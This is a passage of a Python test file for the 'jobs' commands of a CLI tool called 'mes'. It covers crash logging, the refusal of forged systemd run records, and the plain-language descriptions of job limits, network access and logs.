    assert "were not started" not in err  # nothing waits for it


def test_crash_inside_mes_still_logs_the_run(app_root, capsys, mes_home, monkeypatch):
    real = subprocess.Popen

    class Exploding(real):
        def communicate(self, *a, **k):
            raise OverflowError("timeout value is too large")

    monkeypatch.setattr(jobs, "app_commands", lambda *a: {"ok": "read"})
    monkeypatch.setattr(jobs.subprocess, "Popen", Exploding)
    code, data = mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
    assert code == 1
    rec = jobs.read_log(log_file(mes_home))[-1]
    assert rec["job"] == "export" and rec["result"] == "interrupted"


def test_forged_systemd_record_is_refused(app_root, capsys, monkeypatch, mes_home):
    for k, v in {"SERVICE_RESULT": "success", "EXIT_CODE": "exited", "EXIT_STATUS": "0"}.items():
        monkeypatch.setenv(k, v)
    code, data = mes(capsys, "jobs", "record", "sync", "--app-dir", str(app_root))  # not Linux here
    assert code == 5 and data["error"]["code"] == "not_from_systemd"
    monkeypatch.setattr(jobs, "_is_linux", lambda: True)
    monkeypatch.setenv("INVOCATION_ID", INVOCATION)
    monkeypatch.setattr(jobs, "_show", lambda unit, *p: {"InvocationID": "f" * 32})
    code, data = mes(capsys, "jobs", "record", "sync", "--app-dir", str(app_root))
    assert code == 5
    assert not log_file(mes_home).exists()


def test_plain_words_for_limits_network_and_log(app_root, capsys, monkeypatch):
    monkeypatch.setattr(jobs, "_is_linux", lambda: False)
    code, data = mes(capsys, "jobs", "install", "--render-only", "--app-dir", str(app_root))
    sync = next(s for s in data["what_happens"] if s.startswith('Job "sync"'))
    assert "256 MB" in sync and "15 minutes" in sync
    assert "full internet access" in sync and "cannot limit it" in sync
    slow = next(s for s in data["what_happens"] if s.startswith('Job "slow"'))
    assert "1 second." in slow and "has no internet access" in slow

    assert cli.run(["jobs", "list", "--app-dir", str(app_root)]) == 0
    out = capsys.readouterr().out
    assert "full (meant for api.example.com)" in out and "cannot yet limit" in out

    mes(capsys, "jobs", "run", "broken", "--app-dir", str(app_root))
    mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
    assert cli.run(["jobs", "log", "--app-dir", str(app_root)]) == 0
    out = capsys.readouterr().out
    assert "failed" in out and "worked" in out and "by hand" in out and "exit-code" not in out
    assert cli.run(["jobs", "log", "--verify", "--app-dir", str(app_root)]) == 0
    out = capsys.readouterr().out
    assert "intact" in out and "head" not in out
    assert cli.run(["jobs", "status", "--app-dir", str(app_root)]) == 0
    out = capsys.readouterr().out
    assert "switched on here" in out and "Linux server" in out
